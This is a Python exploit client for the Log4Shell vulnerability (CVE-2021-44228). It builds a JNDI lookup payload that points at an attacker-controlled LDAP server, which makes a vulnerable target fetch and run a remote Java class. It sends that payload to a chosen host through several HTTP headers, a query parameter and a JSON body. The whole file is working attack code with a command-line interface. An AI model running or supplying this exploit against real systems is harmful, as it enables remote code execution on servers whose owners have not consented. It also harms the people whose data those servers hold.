#!/usr/bin/env python3
"""
Title:     Log4Shell Exploit Client
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2021-44228
Advisory:  https://www.lunasec.io/docs/blog/log4j-zero-day/

This script sends a malicious JNDI lookup string to a vulnerable Log4j application.
"""

import argparse
import requests
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


def exploit(target_host, target_port, ldap_host, ldap_port, payload_class='Exploit'):
    """
    Send exploit payload to vulnerable Log4j application
    
    Args:
        target_host: Target application host
        target_port: Target application port
        ldap_host: LDAP server host
        ldap_port: LDAP server port
        payload_class: Name of the malicious Java class
    """
    # Construct JNDI lookup payload
    payload = f"${{jndi:ldap://{ldap_host}:{ldap_port}/{payload_class}}}"
    
    logger.info(f"Sending payload: {payload}")
    logger.info(f"Target: http://{target_host}:{target_port}")
    
    # Common injection points for Log4Shell
    injection_points = [
        # User-Agent header
        {'headers': {'User-Agent': payload}},
        # X-Forwarded-For header
        {'headers': {'X-Forwarded-For': payload}},
        # X-Api-Version header
        {'headers': {'X-Api-Version': payload}},
        # Referer header
        {'headers': {'Referer': payload}},
        # Query parameter
        {'params': {'name': payload}},
        # POST body
        {'json': {'username': payload, 'password': 'test'}},
    ]
    
    url = f"http://{target_host}:{target_port}/"
    
    success = False
    for i, injection in enumerate(injection_points):
        try:
            logger.info(f"Trying injection point {i+1}/{len(injection_points)}")
            
            # Try GET request
            if 'json' not in injection:
                response = requests.get(url, timeout=5, **injection)
                logger.info(f"  GET response: {response.status_code}")
            
            # Try POST request
            response = requests.post(url, timeout=5, **injection)
            logger.info(f"  POST response: {response.status_code}")
            
        except requests.exceptions.RequestException as e:
            logger.debug(f"  Error: {e}")
        except Exception as e:
            logger.error(f"  Unexpected error: {e}")
    
    logger.info("\nPayloads sent. Check your LDAP server for callbacks.")
    logger.info("If the target is vulnerable, you should see JNDI lookup requests.")


def main():
    parser = argparse.ArgumentParser(description='Log4Shell Exploit Client')
    parser.add_argument('--target', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--ldap-host', default='127.0.0.1', help='LDAP server host (default: 127.0.0.1)')
    parser.add_argument('--ldap-port', type=int, default=1389, help='LDAP server port (default: 1389)')
    parser.add_argument('--payload-class', default='Exploit', help='Payload class name (default: Exploit)')
    args = parser.parse_args()
    
    exploit(args.target, args.port, args.ldap_host, args.ldap_port, args.payload_class)


if __name__ == '__main__':
    main()
